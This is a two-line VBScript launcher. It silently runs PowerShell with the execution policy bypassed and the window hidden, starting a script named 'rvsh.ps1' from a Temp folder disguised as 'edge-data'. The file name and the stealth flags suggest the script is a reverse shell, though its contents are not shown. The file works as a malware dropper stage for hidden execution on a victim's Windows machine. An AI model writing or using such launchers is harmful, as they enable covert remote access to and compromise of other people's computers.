Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\Users\Asus\AppData\Local\Temp\edge-data\rvsh.ps1", 0, False
